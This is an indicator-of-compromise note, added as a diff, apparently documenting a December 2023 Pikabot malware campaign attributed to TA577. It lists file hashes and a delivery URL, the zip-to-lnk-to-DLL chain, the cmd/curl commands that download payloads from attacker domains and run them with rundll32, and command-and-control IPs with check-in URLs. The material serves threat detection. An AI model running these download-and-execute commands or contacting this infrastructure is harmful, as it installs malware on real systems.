@@ -1,0 +1,67 @@
+13.12.2023 | Pikabot | TA577 | 1.1.17-ghost
+
+*************************************************
+
+.url https://souq-alshashat.com/sia/
+.zip ab288923f9cd681f02aabd023a3c7c167490dfbab639b7ae07f5bc1517f2cb7a
+.dll a93fb9f75e3a93a7334c24f60b3ede274f51ac87c07d7b45320a0081867de2df
+
+*************************************************
+
+zip > lnk > .dll
+
+wscript.exe C:\Users\Admin\AppData\Local\Temp\Qoo.js
+
+cmd.exe /c mkdir  C:\Hfgthdrhrdss\Brgsrhdhtfer & curl https://fertelion.com/mWF/0.7479969772730983.dat --output C:\Hfgthdrhrdss\Brgsrhdhtfer\Urhyhdhthfse.OOOOOCCCCCXXXXX
+
+curl  https://fertelion.com/mWF/0.7479969772730983.dat --output C:\Hfgthdrhrdss\Brgsrhdhtfer\Urhyhdhthfse.OOOOOCCCCCXXXXX
+
+cmd.exe /c timeout 10 & rundll32 C:\Hfgthdrhrdss\Brgsrhdhtfer\Urhyhdhthfse.OOOOOCCCCCXXXXX,Enter
+
+rundll32  C:\Hfgthdrhrdss\Brgsrhdhtfer\Urhyhdhthfse.OOOOOCCCCCXXXXX,Enter
+
+cmd.exe /c mkdir  C:\Hfgthdrhrdss\Brgsrhdhtfer & curl 0.3481500925454001.dat --output C:\Hfgthdrhrdss\Brgsrhdhtfer\Urhyhdhthfse.OOOOOCCCCCXXXXX
+
+cmd.exe /c mkdir  C:\Hfgthdrhrdss\Brgsrhdhtfer & curl 0.585594381224843.dat --output C:\Hfgthdrhrdss\Brgsrhdhtfer\Urhyhdhthfse.OOOOOCCCCCXXXXX
+
+cmd.exe /c mkdir  C:\Hfgthdrhrdss\Brgsrhdhtfer & curl 0.2008474088159145.dat --output C:\Hfgthdrhrdss\Brgsrhdhtfer\Urhyhdhthfse.OOOOOCCCCCXXXXX
+
+cmd.exe /c mkdir  C:\Hfgthdrhrdss\Brgsrhdhtfer & curl https://limperus.com/7AhkO/0.5280603935025379.dat --output C:\Hfgthdrhrdss\Brgsrhdhtfer\Urhyhdhthfse.OOOOOCCCCCXXXXX
+
+cmd.exe /c mkdir  C:\Hfgthdrhrdss\Brgsrhdhtfer & curl https://orionparti.com/QX6Lr/0.9963070188197907.dat --output C:\Hfgthdrhrdss\Brgsrhdhtfer\Urhyhdhthfse.OOOOOCCCCCXXXXX
+
+curl https://limperus.com/7AhkO/0.5280603935025379.dat --output C:\Hfgthdrhrdss\Brgsrhdhtfer\Urhyhdhthfse.OOOOOCCCCCXXXXX
+
+curl 0.585594381224843.dat --output C:\Hfgthdrhrdss\Brgsrhdhtfer\Urhyhdhthfse.OOOOOCCCCCXXXXX
+
+curl https://orionparti.com/QX6Lr/0.9963070188197907.dat --output C:\Hfgthdrhrdss\Brgsrhdhtfer\Urhyhdhthfse.OOOOOCCCCCXXXXX
+
+timeout  10 
+
+curl 0.3481500925454001.dat --output C:\Hfgthdrhrdss\Brgsrhdhtfer\Urhyhdhthfse.OOOOOCCCCCXXXXX
+
+curl 0.2008474088159145.dat --output C:\Hfgthdrhrdss\Brgsrhdhtfer\Urhyhdhthfse.OOOOOCCCCCXXXXX
+
+*************************************************
+
+c2's
+
+154.61.75.156:2078
+154.221.30.136:13724
+64.176.68.223:13785
+172.232.175.59:5938
+172.232.164.159:5632
+95.179.212.178:13782
+172.232.163.208:2224
+
+HTTPS Checking Traffic
+
+https://154.61.75.156:2078/soliciteePhaeophyceae/2EzQoMO1Bzd7h?Matriliny=TootlesOxyurous&allantoides=unspeak&driftboltPycnanthemum=stR17Fz
+https://154.221.30.136:13724/soliciteePhaeophyceae/2EzQoMO1Bzd7h?Matriliny=TootlesOxyurous&allantoides=unspeak&driftboltPycnanthemum=stR17Fz
+https://64.176.68.223:13785/soliciteePhaeophyceae/2EzQoMO1Bzd7h?Matriliny=TootlesOxyurous&allantoides=unspeak&driftboltPycnanthemum=stR17Fz
+https://172.232.175.59:5938/soliciteePhaeophyceae/2EzQoMO1Bzd7h?Matriliny=TootlesOxyurous&allantoides=unspeak&driftboltPycnanthemum=stR17Fz
+https://172.232.164.159:5632/soliciteePhaeophyceae/2EzQoMO1Bzd7h?Matriliny=TootlesOxyurous&allantoides=unspeak&driftboltPycnanthemum=stR17Fz
+https://95.179.212.178:13782/soliciteePhaeophyceae/2EzQoMO1Bzd7h?Matriliny=TootlesOxyurous&allantoides=unspeak&driftboltPycnanthemum=stR17Fz
+https://172.232.163.208:2224/soliciteePhaeophyceae/2EzQoMO1Bzd7h?Matriliny=TootlesOxyurous&allantoides=unspeak&driftboltPycnanthemum=stR17Fz
+
+*************************************************
